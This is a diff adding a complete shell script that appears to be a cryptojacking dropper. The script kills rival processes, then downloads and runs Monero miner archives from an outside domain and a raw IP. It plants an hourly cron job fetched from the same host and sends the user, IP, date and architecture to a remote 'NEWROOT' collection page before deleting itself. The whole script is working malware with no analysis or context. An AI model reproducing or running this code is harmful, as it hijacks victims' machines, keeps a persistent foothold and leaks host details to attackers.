@@ -1,0 +1,28 @@
+#!/bin/sh
+killall -9 rand rx rd tsm tsm2 haiduc a sparky.sh 2238Xae b f i p y rsync ps perl go x s b run idle minerd crond yam xmr python cron ntpd
+rm -rf nohup.out
+ARCH=`uname -m`
+cd /tmp
+curl -O http://www.karaibe.us/.foo/monero.tgz || wget http://67.205.129.169/.foo/monero.tgz || lwp-download http://67.205.129.169/.foo/monero.tgz
+tar zxvf monero.tgz
+rm -rf monero.tgz
+cd .bin
+chmod +x *
+./start > /dev/null &
+cd /tmp
+rm -rf .vd
+mkdir .vd
+cd .vd
+curl -O http://www.karaibe.us/.foo/sslm.tgz || wget http://67.205.129.169/.foo/sslm.tgz || lwp-download http://67.205.129.169/.foo/sslm.tgz
+tar zxvf sslm.tgz
+rm -rf sslm.tgz
+cd .sslm
+./start > /dev/null &
+curl -s http://www.karaibe.us/.foo/remote/cron.sh > /etc/cron.hourly/cron.sh
+chmod +x /etc/cron.hourly/cron.sh
+SERVERIP=`curl http://www.karaibe.us/.foo/remote/info.php`
+curl -d "info=NEWROOT&data=SERVER---> $(whoami)@$SERVERIP <br>DATE---> $(date) <br>ARCH---> $ARCH" http://www.karaibe.us/.foo/remote/info.php > /dev/null
+cd /tmp
+rm -rf $0
+rm -rf min.sh
+rm -rf /tmp/min.sh
